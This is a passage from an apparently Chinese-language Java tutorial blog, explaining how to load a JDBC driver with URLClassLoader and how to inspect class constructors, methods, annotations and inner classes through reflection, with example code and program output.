class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConn</span><span class="params">(String url, String user, String pass)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (conn == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//1）创建一个URL数组</span></span><br><span class="line">            URL[] urls = &#123;<span class="keyword">new</span> URL(<span class="string">&quot;file:mysql-connector-java-5.1.30-bin.jar&quot;</span>)&#125;;</span><br><span class="line">            <span class="comment">//2）以默认的ClassLoader作为父ClassLoader，创建URLClassLoader</span></span><br><span class="line">            URLClassLoader myClassLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">            <span class="comment">//3）加载MySQL的JDBC驱动，并创建默认实例</span></span><br><span class="line">            Driver driver = (Driver) myClassLoader.loadClass(<span class="string">&quot;com.mysql.jdbc.Dreive&quot;</span>).getConstructor().newInstance();</span><br><span class="line">            <span class="comment">//创建一个设置JDBC连接属性的Properties对象</span></span><br><span class="line">            Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">            <span class="comment">//至少需要为该对象传入user和password两个属性</span></span><br><span class="line">            props.setProperty(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">            props.setProperty(<span class="string">&quot;password&quot;</span>, pass);</span><br><span class="line">            <span class="comment">//调用Driver对象的connect方法来获取数据库连接</span></span><br><span class="line">            conn = driver.connect(url, props);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> conn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(getConn(<span class="string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码创建了一个URLClassLoader对象，该对象使用默认的父类加载器，该类加载器的类加载路径是当前路径下的mysql-connector-java-5.1.30-bin.jar文件，将MySQL驱动复制到该路径下，这样保证该ClassLoader可以正常加载到com.mysql.jdbc.Driver类。第3）行代码使用使用ClassLoader的loadClass()加载指定类，并调用Class对象的<code>newInstance()</code>方法创建了一个该类的默认实例——也就得到了<code>com.mysql.jdbc.Driver</code>类的对象，当然该对象的实现类实现了java.sql.Driver接口，所以程序将其强制类型转换为Driver。这里通过Driver而不是DriverManager来获取数据库连接。</p>
<p>正如前面看到的，创建URLClassLoader时传入的一个URL数组参数，该ClassLoader就可以从这系列URL指定的资源中加载指定类，这里的URL可以以file:为前缀，表明从本地文件系统加载；可以以http:为前缀，表明从互联网通过HTTP访问来加载；也可以是ftp:为前缀，表明从互联网通过FTP访问来加载……功能非常强的。</p>
<h2 id="3-通过反射查看类信息"><a href="#3-通过反射查看类信息" class="headerlink" title="3. 通过反射查看类信息"></a>3. 通过反射查看类信息</h2><p>Java程序中的许多对象在运行时都会出现两种类型：编译时类型和运行时类型，例如代码：<code>Person p = new Student()</code>;这行代码将会生成一个p变量，该变量的编译时类型为Person，运行时类型为Student。除此之外还有更极端的情形，程序在运行时接收到外部传入的一个对象，该对象的编译时类型时Object，但程序又需要调用该对象运行时类型的方法。</p>
<p>为了解决这些问题，程序需要在运行时发现对象和类的真实信息。解决该问题有以下两种方法。</p>
<ul>
<li>第一种做法是假设在编译时和运行时都完全知道类型的具体信息，在这种情况下，可以先使用instanceof运算符进行判断，再利用强制类型转换将其转换成其运行时类型的变量即可。</li>
<li>第二种做法是编译时根本无法预知该对象和类可能属于哪些类，程序只依靠运行时信息来发现该对象和类的真实信息，这就必须使用反射。</li>
</ul>
<h3 id="3-1-获得Class对象"><a href="#3-1-获得Class对象" class="headerlink" title="3.1 获得Class对象"></a>3.1 获得Class对象</h3><p>前面已经介绍过了，每个类被加载之后，系统就会为该类生成一个对应的Class对象，通过该Class对象就可以就可以访问到JVM中的这个类。在Java程序中获得Class对象通常有如下三种方式：</p>
<ol>
<li><p>使用Class类的<code>forName(String clzzName)</code>静态方法。该方法需要传入字符串参数，该字符串参数的值是某个类的全限定类名（必须添加完整包名）。</p>
</li>
<li><p>调用某个类的class属性来获取该类对应的Class对象。例如，Person.class将会返回Person类对应的Class对象。</p>
</li>
<li><p>调用某个对象的<code>getClass()</code>方法。该方法是java.lang.Object类中的一个方法，所以所有的Java对象都可以调用该方法，该方法将会返回该对象所属类对应的Class对象。</p>
</li>
</ol>
<p>对于第一种方式和第二种方式都是直接根据类来取得该类的Class对象，相比之下，第二种方式有如下两种优势：</p>
<ol>
<li>代码更安全。程序在编译阶段就可以检查需要访问的Class对象是否存在。</li>
<li>程序性能更好。因为这种方式无须调用方法，所以性能更好</li>
</ol>
<p>也就是说，大部分时候都应该使用第二种方式来获取指定类的Class对象。但如果程序只能获得一个字符串，例如”java.lang.String”，若需要获取该字符串对应的Class对象，则只能使用第一种方式，使用Class的<code>forName(String clazzName)</code>。</p>
<p>一旦获得某个类对应的Class对象之后，程序就可以调用Class对象的方法来获得该对象和该类的真实信息。</p>
<h3 id="3-2-从Class中获取信息"><a href="#3-2-从Class中获取信息" class="headerlink" title="3.2 从Class中获取信息"></a>3.2 从Class中获取信息</h3><p>Class类提供了大量的实例方法来获取该Class对象所对应类的详细信息，Class类大致包含如下方法，下面每个方法都可能包括多个重载的版本，可以查阅API文档来获取。</p>
<p><strong>获取构造器：</strong></p>
<p>下面四个方法用于获取Class对应类所包含的构造器</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>Constructor&lt;T&gt; getConstructor(Class&lt;?&gt;...parameter Types)</code></td>
<td>返回此<code>Class</code>对象对应类的、带指定形参列表的<code>public</code>构造器。</td>
</tr>
<tr>
<td><code>Constructor&lt;?&gt;[] getConstructors()</code></td>
<td>返回此 <code>Class</code>对象对应类的所有<code>public</code>构造器。</td>
</tr>
<tr>
<td><code>Constructor&lt;T&gt; getDeclaredConstructor( Class&lt;?&gt;...parameterTypes)</code></td>
<td>返回此 <code>Class</code>对象对应类的带指定形参列表的构造器,与构造器的访问权限无关。</td>
</tr>
<tr>
<td><code>Constructor&lt;?&gt;[] getDeclaredConstructors()</code></td>
<td>返回此 <code>Class</code>对象对应类的所有构造器,与构造器的访问权限无关。</td>
</tr>
</tbody></table>
<p><strong>获取方法：</strong></p>
<p>下面4个方法用于获取<code>Class</code>对应类所包含的方法。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Method getMethod(String name, Classs&lt;?&gt; ... parameterTypes)</code></td>
<td align="left">返回此<code>Class</code>对象对应类的、带指定形参列表的 <code>public</code>方法。</td>
</tr>
<tr>
<td align="left"><code>Method[] getMethods()</code></td>
<td align="left">返回此<code>Class</code>对象所表示的类的所有 <code>public</code>方法。</td>
</tr>
<tr>
<td align="left"><code>Method getDeclaredMethod(String name, Class&lt;?&gt; ... parameter Types)</code></td>
<td align="left">返回此 <code>Class</code>对象对应类的、带指定形参列表的方法,与方法的访问权限无关。</td>
</tr>
<tr>
<td align="left"><code>Method[] getDeclaredMethods()</code></td>
<td align="left">返回此<code>Class</code>对象对应类的全部方法,与方法的访问权限无关</td>
</tr>
</tbody></table>
<p><strong>获取成员变量：</strong></p>
<p>如下4个方法用于访问<code>Class</code>对应类所包含的成员变量。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Field getField(String name)</code></td>
<td align="left">返回此 <code>Class</code>对象对应类的、指定名称的 <code>public</code>成员变量。</td>
</tr>
<tr>
<td align="left"><code>Field[] getFields()</code></td>
<td align="left">返回此<code>Class</code>对象对应类的所有 <code>public</code>成员变量。</td>
</tr>
<tr>
<td align="left"><code>Field getDeclaredField(String name)</code></td>
<td align="left">返回此 <code>Class</code>对象对应类的、指定名称的成员变量,与成员变量的访问权限无关。</td>
</tr>
<tr>
<td align="left"><code>Field[] getDeclaredFields()</code></td>
<td align="left">返回此 <code>Class</code>对象对应类的全部成员变量,与成员变量的访问权限无关</td>
</tr>
</tbody></table>
<p><strong>获取Annotation：</strong></p>
<p>如下几个方法用于访问<code>Class</code>对应类上所包含的<code>Annotation</code></p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>&lt;A extends Annotation&gt; A getAnnotation(Class&lt;A&gt; annotationClass</code></td>
<td align="left">尝试获取该 <code>Class</code>象对应类上存在的、指定类型的 <code>Annotation</code>;如果该类型的注解不存在,则返回<code>null</code>。</td>
</tr>
<tr>
<td align="left"><code>Annotation[] getAnnotations()</code></td>
<td align="left">返回修饰该 <code>Class</code>对象对应类上存在的所有 <code>Annotation</code></td>
</tr>
<tr>
<td align="left"><code>&lt;A extends annotation&gt; A getDeclaredAnnotation(Class&lt;A&gt; annotationClass)</code></td>
<td align="left">这是<code>Java 8</code>新增的方法,该方法尝试获取直接修饰该<code>Class</code>对象对应类的、指定类型的<code>Annotation</code>;如果该类型的注解不存在,则返回<code>null</code>。</td>
</tr>
<tr>
<td align="left"><code>Annotation[] getDeclaredAnnotations()</code></td>
<td align="left">返回直接修饰该<code>Class</code>对应类的所有 <code>Annotation</code></td>
</tr>
<tr>
<td align="left"><code>&lt;A extends Annotation&gt; A getAnnotationsByType(Class&lt;A&gt; annotationClass)</code></td>
<td align="left">该方法的功能与前面介绍的<code>getAnnotation()</code>方法基本相似。但由于<code>Java 8</code>增加了重复注解功能,因此需要使用该方法获取修饰该类的、指定类型的多个<code>Annotation</code></td>
</tr>
</tbody></table>
<p><strong>获取包含的内部类：</strong></p>
<p>如下方法用于访问该<code>Class</code>对象对应类包含的内部类。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Class&lt;?&gt; getClasses()</code></td>
<td align="left">返回该<code>Class</code>对象对应类里包含的全部内部类。</td>
</tr>
</tbody></table>
<p> <strong>获取所在的外部类</strong></p>
<p>如下方法用于访问该<code>Class</code>对象对应类所在的外部类。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Class&lt;?&gt; getDeclaringClass()</code></td>
<td align="left">返回该<code>Class</code>对象对应类所在的外部类</td>
</tr>
</tbody></table>
<p><strong>访问该Class对象对应类所实现的接口</strong></p>
<p>如下方法用于访问该<code>Class</code>对象对应类所实现的接口</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Classs&lt;?&gt;[] getInterfaces()</code></td>
<td align="left">返回该<code>Class</code>对象对应类所实现的全部接口。</td>
</tr>
</tbody></table>
<p><strong>获取所继承的父类</strong></p>
<p>如下几个方法用于访问该<code>Class</code>对象对应类所继承的父类。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Class&lt;? super T&gt; getSuperClass()</code></td>
<td align="left">返回该<code>Class</code>对象对应类的超类的<code>Class</code>对象。</td>
</tr>
</tbody></table>
<p><strong>获取修饰符 所在包 类名等基本信息</strong></p>
<p>如下方法用于获取<code>Class</code>对象对应类的修饰符、所在包、类名等基本信息。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>int getModifiers()</code></td>
<td align="left">返回此类或接口的所有修饰符。修饰符由 <code>public</code>、 <code>protected</code>、 <code>private</code>、<code>final</code>、<code>static</code>、 <code>abstract</code>等对应的常量组成,返回的整数应使用 <code>Modifier</code>工具类的方法来解码,才可以获取真实的修饰符。</td>
</tr>
<tr>
<td align="left"><code>Package getPackage()</code></td>
<td align="left">获取此类的包。</td>
</tr>
<tr>
<td align="left"><code>String getName()</code></td>
<td align="left">以字符串形式返回此<code>Class</code>象所表示的类的名称。</td>
</tr>
<tr>
<td align="left"><code>String getSimpleName()</code></td>
<td align="left">以字符串形式返回此<code>Class</code>对象所表示的类的简称。</td>
</tr>
</tbody></table>
<p><strong>判断该类是否为接口 枚举 注解类型</strong></p>
<p>除此之外, <code>Class</code>对象还可调用如下几个判断方法来判断该类是否为接口、枚举、注解类型等。</p>
<table>
<thead>
<tr>
<th align="left">方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>boolean isAnnotation()</code></td>
<td align="left">返回此<code>Class</code>对象是否表示一个注解类型(由<code>@interface</code>定义)</td>
</tr>
<tr>
<td align="left"><code>boolean isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass)</code></td>
<td align="left">判断此<code>Class</code>对象是否使用了<code>Annotation</code>修饰</td>
</tr>
<tr>
<td align="left"><code>boolean isAnonymousClass()</code></td>
<td align="left">返回此<code>Class</code>对象是否是一个匿名类。</td>
</tr>
<tr>
<td align="left"><code>boolean isArray()</code></td>
<td align="left">返回此<code>Class</code>对象是否表示一个数组类。</td>
</tr>
<tr>
<td align="left"><code>boolean isEnum()</code></td>
<td align="left">返回此<code>Class</code>象是否表示一个枚举(由<code>enum</code>关键字定义)。</td>
</tr>
<tr>
<td align="left"><code>boolean isInterface()</code></td>
<td align="left">返回此 <code>Class</code>对象是否表示一个接口(使用 <code>interface</code>定义)。</td>
</tr>
<tr>
<td align="left"><code>boolean isInstance(Object object)</code></td>
<td align="left">判断<code>object</code>是否是此<code>Class</code>对象的实例,该方法可以完全代替<code>instanceof</code>操作符。</td>
</tr>
</tbody></table>
<p>上面的多个<code>getMethod()</code>方法和<code>getConstructor()</code>方法中，都需要传入多个类型为Class&lt;?&gt;的参数，用于获取指定的方法或指定的构造器。关于这个参数的作用，假设某个类包含如下三个info方法签名。</p>
<ul>
<li><code>public void info()</code></li>
<li><code>public void info(String str)</code></li>
<li><code>public void info(String str, Integer num)</code></li>
</ul>
<p>这三个同名方法属于重载，它们的方法名相同，但参数列表不同。在Java语言中要确定一个方法光有方法名是不行的，如果仅仅只是指定Info方法——实际上可以是上面三个方法中的任意一个！如果需要确定一个方法，则应该由方法名和形参列表来确定，但形参没有任何实际意义，所以只能由形参类型来确定。例如想指定第二个info方法，则必须指定方法名为info，形参类别为String.class——因此在程序中获取该方法使用如下代码：</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前一个参数指定方法名，后面的个数可变的Class参数指定形参类型列表。</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;info&quot;</span>, <span class="built_in">String</span>.<span class="keyword">class</span>)</span><br></pre></td></tr></table></figure>

<p>如果需要获取第三个info方法，则使用如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前一个参数指定方法名，后面的个数可变的Class参数指定形参类型列表</span></span><br><span class="line">clazz.getMethod(<span class="string">&quot;info&quot;</span>, <span class="keyword">String</span>.<span class="keyword">class</span>, <span class="keyword">Integer</span>.<span class="keyword">class</span>)</span><br></pre></td></tr></table></figure>

<p>获取构造器时无须传入构造器名——同一个类的所有构造器的名字都是相同的，所以要确定一个构造器只要指定形参列表即可。</p>
<p>下面程序示范了如何通过该Class对象来获取对应类的详细信息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义可重复注解</span></span><br><span class="line"><span class="meta">@Repeatable(Annos.class)</span></span><br><span class="line"><span class="meta">@interface</span> Anno &#123;&#125;</span><br><span class="line"><span class="meta">@Retention(value=RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> Annos &#123;</span><br><span class="line">    Anno[] value();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用4个注解修饰该类</span></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;unchecked&quot;)</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="comment">// 使用重复注解修饰该类</span></span><br><span class="line"><span class="meta">@Anno</span></span><br><span class="line"><span class="meta">@Anno</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 为该类定义一个私有的构造器</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ClassTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个有参数的构造器</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassTest</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行有参数的构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个无参数的info方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行无参数的info方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个有参数的info方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行有参数的info方法&quot;</span></span><br><span class="line">                + <span class="string">&quot;，其str参数值：&quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个测试用的内部类</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inner</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 下面代码可以获取ClassTest对应的Class</span></span><br><span class="line">        <span class="comment">// 获取该Class对象所对应类的全部构造器</span></span><br><span class="line">        Class&lt;ClassTest&gt; clazz = ClassTest.class;</span><br><span class="line">        Constructor[] ctors = clazz.getDeclaredConstructors();</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest的全部构造器如下：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Constructor c : ctors) &#123;</span><br><span class="line">            System.out.println(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该Class对象所对应类的全部public构造器</span></span><br><span class="line">        Constructor[] publicCtors = clazz.getConstructors();</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest的全部public构造器如下：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Constructor c : publicCtors) &#123;</span><br><span class="line">            System.out.println(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该Class对象所对应类的全部public方法</span></span><br><span class="line">        Method[] mtds = clazz.getMethods();</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest的全部public方法如下：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Method md : mtds) &#123;</span><br><span class="line">            System.out.println(md);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该Class对象所对应类的指定方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest里带一个字符串参数的info()方法为：&quot;</span> + clazz.getMethod(<span class="string">&quot;info&quot;</span> , String.class));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该Class对象所对应类的上的全部注解</span></span><br><span class="line">        Annotation[] anns = clazz.getAnnotations();</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest的全部Annotation如下：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Annotation an : anns) &#123;</span><br><span class="line">            System.out.println(an);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;该Class元素上的@SuppressWarnings注解为：&quot;</span> + Arrays.toString(clazz.getAnnotationsByType(SuppressWarnings.class)));</span><br><span class="line">        System.out.println(<span class="string">&quot;该Class元素上的@Anno注解为：&quot;</span> + Arrays.toString(clazz.getAnnotationsByType(Anno.class)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取该Class对象所对应类的全部内部类</span></span><br><span class="line">        Class&lt;?&gt;[] inners = clazz.getDeclaredClasses();</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest的全部内部类如下：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Class c : inners) &#123;</span><br><span class="line">            System.out.println(c);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用Class.forName方法加载ClassTest的Inner内部类</span></span><br><span class="line">        <span class="comment">// 通过getDeclaringClass()访问该类所在的外部类</span></span><br><span class="line">        Class inClazz = Class.forName(<span class="string">&quot;reflect.ClassTest$Inner&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;inClazz对应类的外部类为：&quot;</span> + inClazz.getDeclaringClass());</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest的包为：&quot;</span> + clazz.getPackage());</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassTest的父类为：&quot;</span> + clazz.getSuperclass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/bin/java -javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=<span class="number">62107</span>:/Applications/IntelliJ IDEA.app/Contents/bin -Dfile.encoding=UTF-<span class="number">8</span> -classpath /Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/cldrdata.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/jaccess.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/nashorn.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/jfxswt.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/jre/lib/rt.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/lib/ant-javafx.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/lib/dt.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/lib/javafx-mx.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/lib/jconsole.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/lib/packager.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/lib/sa-jdi.jar:/Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_301</span>.jdk/Contents/Home/lib/tools.jar:/Users/shadowflow/code/java/test/target/classes:/Users/shadowflow/.m2/repository/javassist/javassist/<span class="number">3.12</span><span class="number">.1</span>.GA/javassist-<span class="number">3.12</span><span class="number">.1</span>.GA.jar reflect.ClassTest</span><br><span class="line">ClassTest的全部构造器如下：</span><br><span class="line"><span class="keyword">private</span> reflect.ClassTest()</span><br><span class="line"><span class="keyword">public</span> reflect.ClassTest(java.lang.String)</span><br><span class="line">ClassTest的全部<span class="keyword">public</span>构造器如下：</span><br><span class="line"><span class="keyword">public</span> reflect.ClassTest(java.lang.String)</span><br><span class="line">ClassTest的全部<span class="keyword">public</span>方法如下：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> reflect.ClassTest.info()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> reflect.ClassTest.info(java.lang.String)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> reflect.ClassTest.main(java.lang.String[]) <span class="keyword">throws</span> java.lang.Exception</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> java.lang.Object.wait(<span class="keyword">long</span>,<span class="keyword">int</span>) <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.wait(<span class="keyword">long</span>) <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> java.lang.Object.wait() <span class="keyword">throws</span> java.lang.InterruptedException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">boolean</span> java.lang.Object.equals(java.lang.Object)</span><br><span class="line"><span class="keyword">public</span> java.lang.String java.lang.Object.toString()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> java.lang.Object.hashCode()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> java.lang.Class java.lang.Object.getClass()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.notify()</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> java.lang.Object.notifyAll()</span><br><span class="line">ClassTest里带一个字符串参数的info()方法为：<span class="keyword">public</span> <span class="keyword">void</span> reflect.ClassTest.info(java.lang.String)</span><br><span class="line">ClassTest的全部Annotation如下：</span><br><span class="line"><span class="meta">@java</span>.lang.Deprecated()</span><br><span class="line"><span class="meta">@reflect</span>.Annos(value=[<span class="meta">@reflect</span>.Anno(), <span class="meta">@reflect</span>.Anno()])</span><br><span class="line">该Class元素上的<span class="meta">@SuppressWarnings</span>注解为：[]</span><br><span class="line">该Class元素上的<span class="meta">@Anno</span>注解为：[<span class="meta">@reflect</span>.Anno(), <span class="meta">@reflect</span>.Anno()]</span><br><span class="line">ClassTest的全部内部类如下：</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">reflect</span>.<span class="title">ClassTest</span>$<span class="title">Inner</span></span></span><br><span class="line"><span class="class"><span class="title">inClazz</span>对应类的外部类为：<span class="title">class</span> <span class="title">reflect</span>.<span class="title">ClassTest</span></span></span><br><span class="line"><span class="class"><span class="title">ClassTest</span>的包为：<span class="title">package</span> <span class="title">reflect</span></span></span><br><span 